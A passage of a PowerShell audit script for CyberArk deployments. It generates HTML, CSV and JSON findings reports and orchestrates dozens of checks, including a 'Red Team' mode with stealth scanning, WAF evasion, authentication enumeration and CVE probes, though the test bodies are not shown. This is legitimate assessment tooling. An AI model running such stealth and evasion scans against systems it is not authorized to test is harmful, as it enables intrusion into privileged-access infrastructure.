        .stat-card .label {
            color: #636e72;
            text-transform: uppercase;
            font-size: 0.85em;
            letter-spacing: 1px;
        }
        .risk-score {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            margin-bottom: 30px;
            display: flex;
            align-items: center;
            gap: 30px;
        }
        .risk-gauge {
            width: 150px;
            height: 150px;
            border-radius: 50%;
            background: conic-gradient(${riskColor} 0deg, ${riskColor} calc(${[math]::Min($riskScore, 100)} * 3.6deg), #dfe6e9 calc(${[math]::Min($riskScore, 100)} * 3.6deg));
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .risk-gauge::before {
            content: '';
            width: 120px;
            height: 120px;
            background: white;
            border-radius: 50%;
            position: absolute;
        }
        .risk-gauge .score {
            position: relative;
            z-index: 1;
            font-size: 2em;
            font-weight: bold;
            color: ${riskColor};
        }
        .risk-details h2 {
            color: ${riskColor};
            margin-bottom: 10px;
        }
        .section {
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            margin-bottom: 30px;
            overflow: hidden;
        }
        .section-header {
            background: #2d3436;
            color: white;
            padding: 20px 25px;
            font-size: 1.3em;
        }
        .section-content {
            padding: 25px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th {
            background: #f5f6fa;
            padding: 15px;
            text-align: left;
            font-weight: 600;
            border-bottom: 2px solid #dfe6e9;
        }
        td {
            padding: 15px;
            border-bottom: 1px solid #f5f6fa;
            vertical-align: top;
        }
        tr:hover {
            background: #f8f9fa;
        }
        .severity-badge {
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.85em;
            font-weight: 600;
            color: white;
        }
        .status-pass { color: #00b894; }
        .status-fail { color: #d63031; }
        .cis-control {
            background: #dfe6e9;
            padding: 3px 8px;
            border-radius: 4px;
            font-family: monospace;
            font-size: 0.9em;
        }
        .finding-category {
            font-weight: 600;
            color: #2d3436;
        }
        .executive-summary {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
        }
        .summary-list {
            list-style: none;
        }
        .summary-list li {
            padding: 10px 0;
            border-bottom: 1px solid #f5f6fa;
            display: flex;
            justify-content: space-between;
        }
        .chart-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 20px;
        }
        .chart-bar {
            width: 60px;
            background: #f5f6fa;
            border-radius: 5px 5px 0 0;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 10px;
            min-height: 200px;
        }
        .chart-bar .fill {
            width: 100%;
            border-radius: 5px 5px 0 0;
            transition: height 0.5s ease;
        }
        .chart-bar .label {
            margin-top: 10px;
            font-size: 0.75em;
            color: #636e72;
        }
        .filter-controls {
            margin-bottom: 20px;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .filter-btn {
            padding: 8px 16px;
            border: none;
            border-radius: 20px;
            cursor: pointer;
            font-size: 0.9em;
            transition: all 0.3s ease;
        }
        .filter-btn:hover {
            transform: scale(1.05);
        }
        .filter-btn.active {
            color: white;
        }
        @media print {
            .filter-controls { display: none; }
            .section { break-inside: avoid; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>CyberArk Security Audit Report</h1>
            <p>Comprehensive security configuration assessment against CIS Benchmark and Vendor Best Practices</p>
            <div class="header-meta">
                <span><strong>Target:</strong> $PVWA</span>
                <span><strong>Date:</strong> $reportDate</span>
                <span><strong>Total Findings:</strong> $($script:Findings.Count)</span>
            </div>
        </div>

        <div class="dashboard">
            <div class="stat-card">
                <div class="number" style="color: #d63031;">$criticalCount</div>
                <div class="label">Critical</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #e17055;">$highCount</div>
                <div class="label">High</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #fdcb6e;">$mediumCount</div>
                <div class="label">Medium</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #74b9ff;">$lowCount</div>
                <div class="label">Low</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #00b894;">$passCount</div>
                <div class="label">Passed</div>
            </div>
            <div class="stat-card">
                <div class="number" style="color: #95a5a6;">$skippedCount</div>
                <div class="label">Skipped/N/A</div>
            </div>
        </div>

        <div class="risk-score">
            <div class="risk-gauge">
                <span class="score">$riskScore</span>
            </div>
            <div class="risk-details">
                <h2>Risk Rating: $riskRating</h2>
                <p>Based on weighted severity scores of all findings.</p>
                <ul class="summary-list" style="margin-top: 15px;">
                    <li><span>Total Safes Audited</span><strong>$($script:AuditStats.TotalSafes)</strong></li>
                    <li><span>Total Accounts Audited</span><strong>$($script:AuditStats.TotalAccounts)</strong></li>
                    <li><span>Total Users Audited</span><strong>$($script:AuditStats.TotalUsers)</strong></li>
                    <li><span>Unmanaged Accounts</span><strong>$($script:AuditStats.UnmanagedAccounts)</strong></li>
                    <li><span>Pending Discovery Accounts</span><strong>$($script:AuditStats.PendingAccounts)</strong></li>
                </ul>
            </div>
        </div>

        <div class="section">
            <div class="section-header">CIS Benchmark Compliance Summary</div>
            <div class="section-content">
                <table>
                    <thead>
                        <tr>
                            <th>Control</th>
                            <th>Description</th>
                            <th>Findings</th>
                            <th>Status</th>
                        </tr>
                    </thead>
                    <tbody>
"@

    # Add CIS control summary
    foreach ($controlId in ($script:CISControls.Keys | Sort-Object)) {
        $controlFindings = $script:Findings | Where-Object { $_.CISControl -eq $controlId -and $_.Status -eq "Fail" }
        $controlCount = $controlFindings.Count
        $controlStatus = if ($controlCount -eq 0) { "<span class='status-pass'>$(Get-StatusIcon 'Pass') Pass</span>" } else { "<span class='status-fail'>$(Get-StatusIcon 'Fail') $controlCount Issues</span>" }

        $html += @"
                        <tr>
                            <td><span class="cis-control">$controlId</span></td>
                            <td>$($script:CISControls[$controlId])</td>
                            <td>$controlCount</td>
                            <td>$controlStatus</td>
                        </tr>
"@
    }

    $html += @"
                    </tbody>
                </table>
            </div>
        </div>

        <div class="section">
            <div class="section-header">Detailed Findings</div>
            <div class="section-content">
                <div class="filter-controls">
                    <button class="filter-btn active" style="background: #2d3436; color: white;" onclick="filterFindings('all')">All</button>
                    <button class="filter-btn" style="background: #ffebee;" onclick="filterFindings('Critical')">Critical</button>
                    <button class="filter-btn" style="background: #fff3e0;" onclick="filterFindings('High')">High</button>
                    <button class="filter-btn" style="background: #fffde7;" onclick="filterFindings('Medium')">Medium</button>
                    <button class="filter-btn" style="background: #e3f2fd;" onclick="filterFindings('Low')">Low</button>
                </div>
                <table id="findings-table">
                    <thead>
                        <tr>
                            <th>Severity</th>
                            <th>CIS Control</th>
                            <th>Category</th>
                            <th>Finding</th>
                            <th>Resource</th>
                            <th>Current Value</th>
                            <th>Recommendation</th>
                        </tr>
                    </thead>
                    <tbody>
"@

    # Add findings sorted by severity
    $severityOrder = @{ "Critical" = 0; "High" = 1; "Medium" = 2; "Low" = 3; "Info" = 4 }
    $sortedFindings = $script:Findings | Where-Object { $_.Status -eq "Fail" } | Sort-Object { $severityOrder[$_.Severity] }

    foreach ($finding in $sortedFindings) {
        $severityColor = Get-SeverityColor $finding.Severity
        $html += @"
                        <tr class="finding-row" data-severity="$($finding.Severity)">
                            <td><span class="severity-badge" style="background: $severityColor;">$($finding.Severity)</span></td>
                            <td><span class="cis-control">$($finding.CISControl)</span></td>
                            <td class="finding-category">$($finding.Category)</td>
                            <td>$($finding.Finding)</td>
                            <td><code>$($finding.Resource)</code></td>
                            <td>$($finding.CurrentValue)</td>
                            <td>$($finding.Recommendation)</td>
                        </tr>
"@
    }

    $html += @"
                    </tbody>
                </table>
            </div>
        </div>

        <div class="section">
            <div class="section-header">Remediation Priority</div>
            <div class="section-content">
                <h3>Immediate Actions (Critical/High)</h3>
                <ol style="margin: 20px 0; padding-left: 20px;">
"@

    $priorityFindings = $script:Findings | Where-Object { $_.Severity -in @("Critical", "High") -and $_.Status -eq "Fail" } | Select-Object -Unique Recommendation
    foreach ($rec in $priorityFindings) {
        $html += "                    <li style='margin: 10px 0;'>$($rec.Recommendation)</li>`n"
    }

    $html += @"
                </ol>
            </div>
        </div>
"@

    # Add Skipped/Not Applicable Checks section if there are any
    if ($script:SkippedChecks.Count -gt 0) {
        $html += @"
        <div class="section">
            <div class="section-header" style="background: #636e72;">Checks Not Performed / Not Applicable</div>
            <div class="section-content">
                <p style="margin-bottom: 20px; color: #636e72;">
                    The following checks could not be performed or were not applicable to this environment.
                    Review these items to ensure complete security coverage.
                </p>
                <table>
                    <thead>
                        <tr>
                            <th>Status</th>
                            <th>Control</th>
                            <th>Category</th>
                            <th>Check Name</th>
                            <th>Reason</th>
                        </tr>
                    </thead>
                    <tbody>
"@

        foreach ($skipped in $script:SkippedChecks) {
            $statusColor = switch ($skipped.Type) {
                "NotApplicable" { "#95a5a6" }
                "Skipped" { "#f39c12" }
                "Error" { "#e74c3c" }
                "AccessDenied" { "#9b59b6" }
                "Timeout" { "#e67e22" }
                default { "#95a5a6" }
            }
            $statusIcon = switch ($skipped.Type) {
                "NotApplicable" { "N/A" }
                "Skipped" { "SKIP" }
                "Error" { "ERR" }
                "AccessDenied" { "DENY" }
                "Timeout" { "TIME" }
                default { "?" }
            }

            $html += @"
                        <tr>
                            <td><span class="severity-badge" style="background: $statusColor;">$statusIcon</span></td>
                            <td><span class="cis-control">$($skipped.CISControl)</span></td>
                            <td>$($skipped.Category)</td>
                            <td><strong>$($skipped.CheckName)</strong></td>
                            <td>$($skipped.Reason)</td>
                        </tr>
"@
        }

        $html += @"
                    </tbody>
                </table>
            </div>
        </div>
"@
    }

    $html += @"
    </div>

    <script>
        function filterFindings(severity) {
            const rows = document.querySelectorAll('.finding-row');
            const buttons = document.querySelectorAll('.filter-btn');

            buttons.forEach(btn => {
                btn.classList.remove('active');
                btn.style.color = '';
            });
            event.target.classList.add('active');
            event.target.style.color = severity === 'all' ? 'white' : '';

            rows.forEach(row => {
                if (severity === 'all' || row.dataset.severity === severity) {
                    row.style.display = '';
                } else {
                    row.style.display = 'none';
                }
            });
        }
    </script>
</body>
</html>
"@

    $html | Out-File -FilePath $reportPath -Encoding UTF8
    Write-AuditLog "HTML report saved to: $reportPath" -Level Success

    return $reportPath
}

function Export-CSVReport {
    Write-AuditLog "Exporting CSV report..." -Level Info

    $csvPath = Join-Path $OutputPath "CyberArk_Security_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').csv"
    $script:Findings | Export-Csv -Path $csvPath -NoTypeInformation -Encoding UTF8

    Write-AuditLog "CSV report saved to: $csvPath" -Level Success
    return $csvPath
}

function Export-JSONReport {
    Write-AuditLog "Exporting JSON report..." -Level Info

    $jsonPath = Join-Path $OutputPath "CyberArk_Security_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"

    $report = @{
        metadata = @{
            target = $PVWA
            auditDate = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
            totalFindings = $script:Findings.Count
            totalSkipped = $script:SkippedChecks.Count
            statistics = $script:AuditStats
        }
        summary = @{
            critical = ($script:Findings | Where-Object { $_.Severity -eq "Critical" -and $_.Status -eq "Fail" }).Count
            high = ($script:Findings | Where-Object { $_.Severity -eq "High" -and $_.Status -eq "Fail" }).Count
            medium = ($script:Findings | Where-Object { $_.Severity -eq "Medium" -and $_.Status -eq "Fail" }).Count
            low = ($script:Findings | Where-Object { $_.Severity -eq "Low" -and $_.Status -eq "Fail" }).Count
            passed = ($script:Findings | Where-Object { $_.Status -eq "Pass" }).Count
            skipped = ($script:SkippedChecks | Where-Object { $_.Type -eq "Skipped" }).Count
            notApplicable = ($script:SkippedChecks | Where-Object { $_.Type -eq "NotApplicable" }).Count
            errors = ($script:SkippedChecks | Where-Object { $_.Type -eq "Error" }).Count
        }
        findings = $script:Findings
        skippedChecks = $script:SkippedChecks
        cisControls = $script:CISControls
    }

    $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonPath -Encoding UTF8

    Write-AuditLog "JSON report saved to: $jsonPath" -Level Success
    return $jsonPath
}
#endregion

#region Main Execution
function Start-Audit {
    # Display banner unless suppressed
    if (-not $NoLogo) {
        Write-Host ""
        Write-Host "========================================================" -ForegroundColor Cyan
        Write-Host "  CyberArk Security Configuration Audit v4.2" -ForegroundColor Cyan
        Write-Host "  Comprehensive Security Assessment Suite" -ForegroundColor Cyan
        Write-Host "  Red Team / Offensive Security Edition" -ForegroundColor Red
        Write-Host "========================================================" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  Check Categories:" -ForegroundColor Gray
        Write-Host "    [UNAUTH] Blackbox/Network/CVE Security (No auth required)" -ForegroundColor DarkGray
        Write-Host "    [AUTH]   CIS/Vendor/Identity Governance (CyberArk auth)" -ForegroundColor DarkGray
        Write-Host "    [AUTH]   Machine Identity/Secrets/ZSP/Cloud/DR/AD Security" -ForegroundColor DarkGray
        Write-Host "    [HOST]   Windows Host/Server/Component Hardening (Local admin)" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "  New in v4.2: Red Team Enhancements" -ForegroundColor Red
        Write-Host "    - OPSEC Mode: Stealth scanning with delays/jitter" -ForegroundColor DarkRed
        Write-Host "    - Proxy Support: Route through Burp/ZAP" -ForegroundColor DarkRed
        Write-Host "    - Timing Attacks: Authentication enumeration" -ForegroundColor DarkRed
        Write-Host "    - JWT/OAuth2: Token security testing" -ForegroundColor DarkRed
        Write-Host "    - WebSocket: Real-time endpoint discovery" -ForegroundColor DarkRed
        Write-Host "    - WAF Evasion: Encoding bypass detection" -ForegroundColor DarkRed
        Write-Host ""
        Write-Host "  CyberArk Tools Integration (v4.1):" -ForegroundColor Cyan
        Write-Host "    - zBang: AD security (Shadow Admins, Kerberos, SPNs)" -ForegroundColor DarkCyan
        Write-Host "    - CYBRHardeningCheck: Vault/PSM/PVWA/CPM hardening" -ForegroundColor DarkCyan
        Write-Host "    - Evasor: Application control bypass detection" -ForegroundColor DarkCyan
        Write-Host "    - Conjur: Secrets Manager integration" -ForegroundColor DarkCyan
        Write-Host ""
        Write-Host "  Target: $PVWA" -ForegroundColor White
        if ($Proxy) { Write-Host "  Proxy: $Proxy" -ForegroundColor Yellow }
        if ($OPSECMode) { Write-Host "  Mode: OPSEC/Stealth" -ForegroundColor Red }
        Write-Host ""
    }

    # Initialize web request defaults (proxy, TLS, User-Agent)
    Initialize-WebRequestDefaults

    # Check prerequisites
    Test-Prerequisites | Out-Null

    # Initialize OPSEC mode if enabled
    if ($OPSECMode) {
        Initialize-OPSECMode
    }

    # Store script-level parameters for use in helper functions
    $script:RequestDelay = $RequestDelay
    $script:Jitter = $Jitter

    # Initialize global variables
    $script:Findings = @()
    $script:SkippedChecks = @()
    $script:AuditStats = @{
        TotalSafes = 0
        TotalAccounts = 0
        TotalUsers = 0
        UnmanagedAccounts = 0
        PendingAccounts = 0
        ChecksPerformed = 0
        ChecksSkipped = 0
        ChecksFailed = 0
        AuthenticatedChecksRun = $false
        StartTime = Get-Date
        OPSECMode = $OPSECMode.IsPresent
        ProxyUsed = if ($Proxy) { $true } else { $false }
    }
    $script:SafesWithAccounts = @{}
    $script:IsAuthenticated = $false

    #======================================================================
    # PHASE 1: UNAUTHENTICATED CHECKS (No credentials required)
    #======================================================================
    Write-Host ""
    Write-Host "+============================================================+" -ForegroundColor Magenta
    Write-Host "|  PHASE 1: UNAUTHENTICATED SECURITY CHECKS                |" -ForegroundColor Magenta
    Write-Host "|  (No credentials required - External/Blackbox testing)   |" -ForegroundColor Magenta
    Write-Host "+============================================================+" -ForegroundColor Magenta

    Write-Host ""
    Write-Host "[UNAUTH] Running Network Security Checks..." -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Yellow

    if (-not $SkipPortScan) {
        try { Test-PortScan } catch { Add-SkippedCheck -Category "Network Security" -CISControl "NET1" -CheckName "Port Scan" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-VaultPortSecurity } catch { Add-SkippedCheck -Category "Network Security" -CISControl "NET2" -CheckName "Vault Port Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    }
    else {
        Add-SkippedCheck -Category "Network Security" -CISControl "NET1" `
            -CheckName "Port Scan" `
            -Reason "Skipped via -SkipPortScan parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "Network Security" -CISControl "NET2" `
            -CheckName "Vault Port Security Check" `
            -Reason "Skipped via -SkipPortScan parameter" `
            -Type "Skipped"
    }
    try { Test-CipherSuites } catch { Add-SkippedCheck -Category "TLS Security" -CISControl "TLS1" -CheckName "Cipher Suite Check" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-DNSSecurity } catch { Add-SkippedCheck -Category "Network Security" -CISControl "NET7" -CheckName "DNS Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    Write-Host ""
    Write-Host "[UNAUTH] Running TLS/SSL Security Checks..." -ForegroundColor Yellow
    Write-Host "============================================" -ForegroundColor Yellow

    try { Test-TLSConfiguration } catch { Add-SkippedCheck -Category "Transport Security" -CISControl "8.1" -CheckName "TLS Configuration" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-CertificateIssues } catch { Add-SkippedCheck -Category "Certificate" -CISControl "BB9" -CheckName "Certificate Check" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    Write-Host ""
    Write-Host "[UNAUTH] Running Blackbox Security Checks..." -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow

    try { Test-ExposedEndpoints } catch { Add-SkippedCheck -Category "Exposed Endpoints" -CISControl "BB1" -CheckName "Exposed Endpoints" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-InformationDisclosure } catch { Add-SkippedCheck -Category "Information Disclosure" -CISControl "BB2" -CheckName "Information Disclosure" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-DefaultCredentials } catch { Add-SkippedCheck -Category "Default Credentials" -CISControl "BB3" -CheckName "Default Credentials" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-HTTPMethods } catch { Add-SkippedCheck -Category "HTTP Methods" -CISControl "BB4" -CheckName "HTTP Methods" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-CookieSecurity } catch { Add-SkippedCheck -Category "Cookie Security" -CISControl "BB5" -CheckName "Cookie Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-CORSConfiguration } catch { Add-SkippedCheck -Category "CORS Configuration" -CISControl "BB6" -CheckName "CORS Configuration" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-BackupAndConfigFiles } catch { Add-SkippedCheck -Category "Exposed Files" -CISControl "BB7" -CheckName "Backup/Config Files" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-DirectoryListing } catch { Add-SkippedCheck -Category "Directory Listing" -CISControl "BB8" -CheckName "Directory Listing" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-RateLimiting } catch { Add-SkippedCheck -Category "Rate Limiting" -CISControl "BB10" -CheckName "Rate Limiting" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-KnownVulnerabilities } catch { Add-SkippedCheck -Category "Known Vulnerabilities" -CISControl "BB11" -CheckName "Known Vulnerabilities" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    Write-Host ""
    Write-Host "[UNAUTH] Running PVWA Web Security Checks..." -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow

    try { Test-PVWASecurity } catch { Add-SkippedCheck -Category "PVWA Security" -CISControl "V7.1" -CheckName "PVWA Security Headers" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-SessionSecurity } catch { Add-SkippedCheck -Category "Session Security" -CISControl "V7.2" -CheckName "Session Security" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-HeaderInjection } catch { Add-SkippedCheck -Category "Header Security" -CISControl "V7.1" -CheckName "Header Injection" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-XXEVulnerability } catch { Add-SkippedCheck -Category "XXE Vulnerability" -CISControl "API2" -CheckName "XXE Vulnerability" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    if (-not $SkipCVEChecks) {
        Write-Host ""
        Write-Host "[UNAUTH] Running CVE-Specific Vulnerability Checks..." -ForegroundColor Yellow
        Write-Host "======================================================" -ForegroundColor Yellow

        try { Test-CVE202131796 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE1" -CheckName "CVE-2021-31796" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE202222536 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE2" -CheckName "CVE-2022-22536" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE202343903 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE3" -CheckName "CVE-2023-43903" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE202442340 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE5" -CheckName "CVE-2024-42340" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE202442339 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE6" -CheckName "CVE-2024-42339" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-AdditionalCVEs } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "BB11" -CheckName "Additional CVEs" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        
        # 2025 CVE Checks
        Write-Host ""
        Write-Host "[UNAUTH] Running 2025 CVE Checks..." -ForegroundColor Yellow
        Write-Host "=====================================" -ForegroundColor Yellow
        try { Test-CVE2025EPM } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE7" -CheckName "CVE-2025 EPM Vulnerabilities" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE2025SecretsManager } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE12" -CheckName "CVE-2025 Secrets Manager Vulnerabilities" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CVE202438996 } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE15" -CheckName "CVE-2024-38996 Prototype Pollution" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
        try { Test-CA25Bulletins } catch { Add-SkippedCheck -Category "CVE Assessment" -CISControl "CA25-32" -CheckName "CA25 Security Bulletins" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    }
    else {
        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE1" `
            -CheckName "CVE-2021-31796 (SSRF)" `
            -Reason "Skipped via -SkipCVEChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE2" `
            -CheckName "CVE-2022-22536 (Auth Bypass)" `
            -Reason "Skipped via -SkipCVEChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE3" `
            -CheckName "CVE-2023-43903 (XSS)" `
            -Reason "Skipped via -SkipCVEChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE5" `
            -CheckName "CVE-2024-42340 (DOM XSS)" `
            -Reason "Skipped via -SkipCVEChecks parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "CVE Assessment" -CISControl "CVE6" `
            -CheckName "CVE-2024-42339 (HTML Injection)" `
            -Reason "Skipped via -SkipCVEChecks parameter" `
            -Type "Skipped"
    }

    if (-not $SkipAPITests) {
        Write-Host ""
        Write-Host "[UNAUTH] Running API Security Checks (Unauthenticated)..." -ForegroundColor Yellow
        Write-Host "==========================================================" -ForegroundColor Yellow

        try { Test-APISecurity } catch { Add-SkippedCheck -Category "API Security" -CISControl "API1" -CheckName "API Security Tests" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    }
    else {
        Add-SkippedCheck -Category "API Security" -CISControl "API1" `
            -CheckName "API Authentication Bypass" `
            -Reason "Skipped via -SkipAPITests parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "API Security" -CISControl "API2" `
            -CheckName "Injection Vulnerability Testing" `
            -Reason "Skipped via -SkipAPITests parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "API Security" -CISControl "API3" `
            -CheckName "BOLA/IDOR Testing" `
            -Reason "Skipped via -SkipAPITests parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "API Security" -CISControl "API4" `
            -CheckName "Mass Assignment Testing" `
            -Reason "Skipped via -SkipAPITests parameter" `
            -Type "Skipped"
        Add-SkippedCheck -Category "API Security" -CISControl "API5" `
            -CheckName "API Versioning Security" `
            -Reason "Skipped via -SkipAPITests parameter" `
            -Type "Skipped"
    }

    # Advanced Red Team Security Checks (v4.2)
    if ($IncludeTimingAttacks -or $IncludeJWTTests -or $IncludeWebSocketTests -or $IncludeWAFEvasion) {
        Write-Host ""
        Write-Host "[UNAUTH] Running Advanced Red Team Security Checks..." -ForegroundColor Red
        Write-Host "======================================================" -ForegroundColor Red

        try { Test-AdvancedSecurityChecks } catch {
            Add-SkippedCheck -Category "Advanced Security" -CISControl "API1" `
                -CheckName "Advanced Red Team Checks" `
                -Reason "Error: $($_.Exception.Message)" -Type "Error"
        }
    }

    Write-Host ""
    Write-Host "[UNAUTH] Running Component Version Detection..." -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Yellow

    try { Test-ComponentVersions } catch { Add-SkippedCheck -Category "Version Detection" -CISControl "BB2" -CheckName "Component Versions" -Reason "Error: $($_.Exception.Message)" -Type "Error" }

    Write-Host ""
    Write-AuditLog "Phase 1 (Unauthenticated) checks complete." -Level Success

    #======================================================================
    # PHASE 2: AUTHENTICATED CHECKS (CyberArk API credentials required)
    #======================================================================
    if ($UnauthenticatedOnly) {
        Write-Host ""
        Write-Host "+============================================================+" -ForegroundColor DarkGray
        Write-Host "+============================================================+" -ForegroundColor DarkGray
        Write-Host "â•‘  (Use without -UnauthenticatedOnly to run these checks)  â•‘" -ForegroundColor DarkGray
        Write-Host "+============================================================+" -ForegroundColor DarkGray

        # Record all authenticated checks as skipped
        $authChecks = @(
            @{ Cat = "Safe Configuration"; Ctrl = "3.1"; Name = "Safe Configuration Audit" },
            @{ Cat = "Credential Management"; Ctrl = "4.1"; Name = "Account Configuration Audit" },
            @{ Cat = "Platform Configuration"; Ctrl = "2.4"; Name = "Platform Configuration Audit" },
            @{ Cat = "User Management"; Ctrl = "5.1"; Name = "User Configuration Audit" },
            @{ Cat = "Authentication"; Ctrl = "5.1"; Name = "Authentication Methods Audit" },
            @{ Cat = "System Health"; Ctrl = "7.3"; Name = "Component Health Check" },
            @{ Cat = "Master Policy"; Ctrl = "V1.1"; Name = "Master Policy Audit" },
            @{ Cat = "PSM Configuration"; Ctrl = "V2.1"; Name = "PSM Configuration Audit" },
            @{ Cat = "Account Discovery"; Ctrl = "V3.1"; Name = "Account Discovery Audit" },
            @{ Cat = "Privileged Threat Analytics"; Ctrl = "V4.1"; Name = "PTA Configuration Audit" },
            @{ Cat = "Linked Accounts"; Ctrl = "V6.1"; Name = "Linked Accounts Audit" },
            @{ Cat = "CPM Configuration"; Ctrl = "V8.1"; Name = "CPM Configuration Audit" }
        )
        foreach ($check in $authChecks) {
            Add-SkippedCheck -Category $check.Cat -CISControl $check.Ctrl `
                -CheckName $check.Name `
                -Reason "Skipped via -UnauthenticatedOnly parameter (requires CyberArk API authentication)" `
                -Type "Skipped"
        }
    }
    elseif ($SkipAuthenticatedChecks) {
        Write-Host ""
        Write-Host "+============================================================+" -ForegroundColor DarkGray
        Write-Host "+============================================================+" -ForegroundColor DarkGray
        Write-Host "â•‘  (Skipped via -SkipAuthenticatedChecks parameter)        â•‘" -ForegroundColor DarkGray
        Write-Host "+============================================================+" -ForegroundColor DarkGray

        Add-SkippedCheck -Category "Authenticated Checks" -CISControl "3.1" `
            -CheckName "All Authenticated Checks" `
            -Reason "Skipped via -SkipAuthenticatedChecks parameter" `
            -Type "Skipped"
    }
    else {
        Write-Host ""
        Write-Host "+============================================================+" -ForegroundColor Green
    Write-Host "|  PHASE 2: AUTHENTICATED SECURITY CHECKS                  |" -ForegroundColor Green
    Write-Host "|  (Requires CyberArk API credentials)                     |" -ForegroundColor Green
        Write-Host "+============================================================+" -ForegroundColor Green
        Write-Host ""
        Write-Host "  The following checks require authenticated access to the" -ForegroundColor Cyan
        Write-Host "  CyberArk REST API with appropriate permissions:" -ForegroundColor Cyan
        Write-Host ""
        Write-Host "  - Safe configurations and permissions" -ForegroundColor Gray
        Write-Host "  - Account and credential management settings" -ForegroundColor Gray
        Write-Host "  - Platform configurations" -ForegroundColor Gray
        Write-Host "  - User accounts and vault permissions" -ForegroundColor Gray
        Write-Host "  - Authentication method settings" -ForegroundColor Gray
        Write-Host "  - Component health status" -ForegroundColor Gray
        Write-Host "  - Master Policy settings" -ForegroundColor Gray
        Write-Host "  - PSM, CPM, PTA configurations" -ForegroundColor Gray
        Write-Host ""
        Write-Host "  Required permissions: Vault Admin or Auditor role recommended" -ForegroundColor Yellow
        Write-Host ""

        # Connect to CyberArk
        if (Connect-CyberArk) {
            $script:IsAuthenticated = $true
            $script:AuditStats.AuthenticatedChecksRun = $true

            try {
                Write-Host ""
                Write-Host "[AUTH] Running CIS Benchmark Audits..." -ForegroundColor Yellow
                Write-Host "=======================================" -ForegroundColor Yellow

                try { Test-SafeConfigurations } catch { Add-SkippedCheck -Category "Safe Configuration" -CISControl "3.1" -CheckName "Safe Configuration Audit" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
